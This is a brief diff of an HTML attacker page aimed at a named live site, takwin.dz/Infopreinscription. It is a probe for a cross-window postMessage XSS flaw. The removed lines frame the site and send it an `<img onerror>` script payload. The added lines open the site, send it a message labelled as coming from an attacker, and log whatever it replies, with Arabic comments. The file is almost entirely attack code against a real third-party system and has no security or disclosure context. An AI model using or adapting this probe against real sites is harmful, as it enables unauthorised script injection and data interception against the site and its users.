@@ -1,10 +1,13 @@
-<iframe src="https://www.takwin.dz/Infopreinscription"></iframe>
 <script>
-  setTimeout(() => {
-    const iframe = document.querySelector("iframe");
-    iframe.contentWindow.postMessage(
-      `<img src=x onerror="alert('XSS via postMessage')" />`, "*"
-    );
-  }, 1000);
+  const takwin = window.open("https://www.takwin.dz/Infopreinscription");
+
+  // أرسل رسالة
+  takwin?.postMessage("hello from attacker", "*");
+
+  // استقبل رسالة
+  window.addEventListener("message", (e) => {
+    console.log("رسالة من takwin:", e.origin, e.data);
+  });
 </script>
+
 
